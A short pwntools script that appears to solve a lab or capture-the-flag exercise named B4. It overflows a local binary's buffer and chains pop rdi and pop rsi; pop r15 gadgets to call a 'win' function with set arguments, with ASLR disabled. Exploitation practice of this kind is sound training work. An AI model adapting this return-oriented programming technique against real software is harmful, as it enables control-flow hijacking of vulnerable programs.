#!/usr/bin/env python3
# B4: multi-gadget con pop rdi + pop rsi; pop r15
from pwn import context, process, ELF, p64, asm, log
context.binary = "./bin/b4"
elf = ELF("./bin/b4")
OFFSET = 76
win = elf.symbols["win"]
pop_rdi_ret     = next(elf.search(asm("pop rdi; ret"), writable=False))
pop_rsi_r15_ret = next(elf.search(asm("pop rsi; pop r15; ret"), writable=False))
ret = next(elf.search(asm("ret"), writable=False))
log.info(f"pop rdi @ {hex(pop_rdi_ret)}, pop rsi r15 @ {hex(pop_rsi_r15_ret)}")
payload  = b"A" * OFFSET + p64(ret)
payload += p64(pop_rdi_ret) + p64(0xdead)
payload += p64(pop_rsi_r15_ret) + p64(0xbeef) + p64(0)
payload += p64(win)
io = process(["setarch", "x86_64", "-R", "./bin/b4"])
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors="replace"))
